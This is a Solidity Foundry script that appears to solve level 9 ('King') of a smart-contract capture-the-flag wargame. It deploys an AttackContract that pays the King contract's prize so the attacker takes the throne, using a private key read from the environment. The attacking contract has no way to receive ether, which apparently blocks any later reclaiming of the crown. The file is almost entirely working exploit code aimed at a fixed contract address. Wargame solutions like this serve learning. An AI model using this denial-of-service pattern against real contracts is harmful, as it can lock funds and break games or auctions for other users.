// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/King.sol";

contract Level9Script is Script {
    King king = King(payable(0x3cB274c9c4A05B1Aa35e23366E670BF3e3C82714));

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        AttackContract attackContract = new AttackContract{value: 0.001 ether}();
        attackContract.pwn();

        vm.stopBroadcast();
    }
}

contract AttackContract {
    King king = King(payable(0x3cB274c9c4A05B1Aa35e23366E670BF3e3C82714));

    constructor() payable {}

    function pwn() public payable {
        (bool sucess,) = address(king).call{value: king.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
        require(sucess, "Faleed to become King ");
    }
}
